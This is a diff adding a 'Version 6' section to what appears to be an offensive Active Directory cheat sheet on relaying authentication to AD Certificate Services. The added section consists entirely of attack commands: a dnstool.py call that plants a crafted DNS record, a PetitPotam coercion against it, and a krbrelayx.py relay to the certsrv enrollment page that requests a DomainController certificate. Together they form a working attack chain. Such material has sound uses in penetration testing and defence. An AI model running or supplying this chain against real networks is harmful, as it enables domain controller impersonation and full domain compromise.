@@ -84,6 +84,19 @@ Require [SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket/pul
   certipy relay -ca 172.16.19.100
   ```
 
+* **Version 6**: Kerberos Relay (self relay in case of only one DC)
+
+  ```ps1
+  # Add dns entry with the james forshaw's trick
+  dnstool.py -u "domain.local\user" -p "password" -r "computer1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" -d "10.10.10.10" --action add "10.10.10.11" --tcp
+
+  # Coerce kerberos with petit potam on dns entry
+  petitpotam.py -u 'user' -p 'password' -d domain.local 'computer1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' computer.domain.local
+
+  # relay kerberos
+  python3 krbrelayx.py -t 'http://computer.domain.local/certsrv/certfnsh.asp' --adcs --template DomainController -v 'COMPUTER$' -ip 10.10.10.10
+  ```
+
 ## References
 
 * [NTLM relaying to AD CS - On certificates, printers and a little hippo - Dirk-jan Mollema](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
